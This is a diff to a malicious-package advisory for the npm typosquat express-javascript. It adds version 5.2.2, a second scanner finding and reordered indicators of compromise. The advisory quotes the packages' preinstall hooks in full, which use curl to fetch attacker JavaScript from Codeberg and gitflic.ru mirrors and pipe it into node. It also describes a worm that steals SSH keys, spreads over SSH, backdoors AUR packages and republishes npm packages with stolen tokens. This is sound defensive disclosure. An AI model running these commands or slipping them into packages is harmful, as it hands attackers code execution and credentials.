@@ -2,9 +2,9 @@
   "schema_version": "1.7.4",
   "id": "MAL-2026-17242",
   "published": "2026-09-29T07:12:49Z",
-  "modified": "2026-10-01T08:00:00Z",
+  "modified": "2026-10-05T22:46:44.617372170Z",
   "summary": "Malicious code in express-javascript (npm)",
-  "details": "The package express-javascript impersonates the legitimate 'express' package (it republishes express's package metadata and code) and adds a malicious preinstall hook that runs automatically on npm install, before any dependency is installed: `curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node`. The hook downloads a remote JavaScript second stage from a Wayback Machine mirror of a Codeberg repository (hellscripter/install-scripts) and pipes it directly into node, giving the attacker arbitrary code execution on the installing machine. Version 5.2.1 was published on 2026-09-29. It is one of nine packages published within about 33 minutes by the npm account 'dirtyblanket' (maintainer email s7dwzxru4z@ooynib.com), all carrying the identical preinstall hook: xeprews, express-javascript, express-nodejs, react-nodejs, exprdd, exprrdd, exptrdd, exptred, exptredd.\n\nOn Linux, node.js pipes linux.sh from the same Codeberg repository into bash. linux.sh (SHA-256 65f0a95b24e30305146346cbc2452cfabadab9e1ca35053e1134b67c38919577) is a worm. It installs a Go binary, systemd-fontd, as a systemd service named \"Font Rendering Service\" that proxies through Tor. SafeDep has not yet analyzed that binary. The script collects SSH private keys and known_hosts files, then connects to the known hosts over SSH and runs linux.sh on them. With the same keys, it pushes a linux.sh loader into the .install file of Arch User Repository (AUR) packages that the key owner maintains. For each package.json on disk, it adds the same preinstall script, runs npm version patch, and runs npm publish with each .npmrc it finds.\n\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (73e4909976d37fb7fb7dd30012d82bd882608df20716a824f1dc0efa074b5401)\nexpress-javascript@5.2.1 impersonates the express package (copying its description, author, contributors, repository, homepage, and dependency list verbatim) while its package.json preinstall lifecycle hook runs `curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node`, fetching a JavaScript file from a third-party account unrelated to the express publisher via a web.archive.org wrapper on a mutable `branch/main` ref and piping it into node with no integrity check. Every `npm install` of this package executes whatever bytes that endpoint returns on the installer's machine.\n",
+  "details": "The package express-javascript impersonates the legitimate 'express' package (it republishes express's package metadata and code) and adds a malicious preinstall hook that runs automatically on npm install, before any dependency is installed: `curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node`. The hook downloads a remote JavaScript second stage from a Wayback Machine mirror of a Codeberg repository (hellscripter/install-scripts) and pipes it directly into node, giving the attacker arbitrary code execution on the installing machine. Version 5.2.1 was published on 2026-09-29. It is one of nine packages published within about 33 minutes by the npm account 'dirtyblanket' (maintainer email s7dwzxru4z@ooynib.com), all carrying the identical preinstall hook: xeprews, express-javascript, express-nodejs, react-nodejs, exprdd, exprrdd, exptrdd, exptred, exptredd.\n\nOn Linux, node.js pipes linux.sh from the same Codeberg repository into bash. linux.sh (SHA-256 65f0a95b24e30305146346cbc2452cfabadab9e1ca35053e1134b67c38919577) is a worm. It installs a Go binary, systemd-fontd, as a systemd service named \"Font Rendering Service\" that proxies through Tor. SafeDep has not yet analyzed that binary. The script collects SSH private keys and known_hosts files, then connects to the known hosts over SSH and runs linux.sh on them. With the same keys, it pushes a linux.sh loader into the .install file of Arch User Repository (AUR) packages that the key owner maintains. For each package.json on disk, it adds the same preinstall script, runs npm version patch, and runs npm publish with each .npmrc it finds.\n\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (a84bd81adecaf93be6fe963765bf1686f6b6bcefac1b8a6124bc2841053fd265)\nexpress-javascript@5.2.2 is a typosquat of the real express framework, shipping cloned package metadata (author TJ Holowaychuk, repository expressjs/express, homepage expressjs.com, matching keywords and dependencies) to appear as the genuine package. Its package.json declares a preinstall lifecycle hook that runs `curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node`, downloading a remote, unpinned, non-publisher JavaScript payload from a third-party Russian code-hosting service (proxied through web.archive.org) and piping it directly into node for execution. The fetch and execute fire automatically on `npm install` with no integrity check, no version pinning, and no relation to the express project's real infrastructure. The fetched content is attacker-controlled and can change at any time.\n",
   "affected": [
     {
       "package": {
@@ -12,10 +12,21 @@
         "ecosystem": "npm"
       },
       "versions": [
-        "5.2.1"
+        "5.2.1",
+        "5.2.2"
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -55,45 +66,49 @@
     {
       "type": "REPORT",
       "url": "https://safedep.io/dirtyblanket-express-impersonation-npm/"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/express-javascript/v/5.2.2"
     }
   ],
   "database_specific": {
     "iocs": {
+      "files": [
+        {
+          "note": "preinstall script pipes the web.archive.org copy of node.js into node.",
+          "paths": [
+            "package.json"
+          ],
+          "source": "PACKAGE_ARCHIVE"
+        },
+        {
+          "digests": {
+            "sha256": "65f0a95b24e30305146346cbc2452cfabadab9e1ca35053e1134b67c38919577"
+          },
+          "note": "Stage two Bash worm, piped from curl into bash.",
+          "paths": [
+            "linux.sh"
+          ],
+          "source": "IN_MEMORY"
+        },
+        {
+          "digests": {
+            "sha256": "2c9dbc14809f1e1aebda114194368b002acf74c8760b88fc101f625d179793c2"
+          },
+          "note": "systemd-fontd, a stripped Go ELF x86-64 binary run as the \"Font Rendering Service\" systemd service. First path as root, second path without root.",
+          "paths": [
+            "/usr/lib/systemd/systemd-fontrenderd",
+            "~/.config/systemd/systemd-fontcached"
+          ],
+          "source": "DROPPED"
+        }
+      ],
       "urls": [
         "https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js",
         "https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js",
         "https://codeberg.org/hellscripter/install-scripts/raw/branch/main/linux.sh",
         "https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/systemd-fontd"
-      ],
-      "files": [
-        {
-          "source": "PACKAGE_ARCHIVE",
-          "paths": [
-            "package.json"
-          ],
-          "note": "preinstall script pipes the web.archive.org copy of node.js into node."
-        },
-        {
-          "source": "IN_MEMORY",
-          "paths": [
-            "linux.sh"
-          ],
-          "digests": {
-            "sha256": "65f0a95b24e30305146346cbc2452cfabadab9e1ca35053e1134b67c38919577"
-          },
-          "note": "Stage two Bash worm, piped from curl into bash."
-        },
-        {
-          "source": "DROPPED",
-          "paths": [
-            "/usr/lib/systemd/systemd-fontrenderd",
-            "~/.config/systemd/systemd-fontcached"
-          ],
-          "digests": {
-            "sha256": "2c9dbc14809f1e1aebda114194368b002acf74c8760b88fc101f625d179793c2"
-          },
-          "note": "systemd-fontd, a stripped Go ELF x86-64 binary run as the \"Font Rendering Service\" systemd service. First path as root, second path without root."
-        }
       ]
     },
     "malicious-packages-origins": [
@@ -105,6 +120,16 @@
         "source": "amazon-inspector",
         "versions": [
           "5.2.1"
+        ]
+      },
+      {
+        "id": "IN-MAL-2026-020871",
+        "import_time": "2026-10-04T23:16:29.438581764Z",
+        "modified_time": "2026-10-04T23:11:52Z",
+        "sha256": "a84bd81adecaf93be6fe963765bf1686f6b6bcefac1b8a6124bc2841053fd265",
+        "source": "amazon-inspector",
+        "versions": [
+          "5.2.2"
         ]
       }
     ]
@@ -118,15 +143,23 @@
       "type": "FINDER"
     },
     {
+      "name": "InvisiRisk, Inc.",
+      "contact": [
+        "https://www.invisirisk.com",
+        "mailto:research@invisirisk.com"
+      ],
+      "type": "FINDER"
+    },
+    {
       "name": "Pranesh, InvisiRisk",
       "type": "FINDER"
     },
     {
       "name": "SafeDep",
-      "type": "FINDER",
       "contact": [
         "https://safedep.io"
-      ]
+      ],
+      "type": "FINDER"
     }
   ]
 }
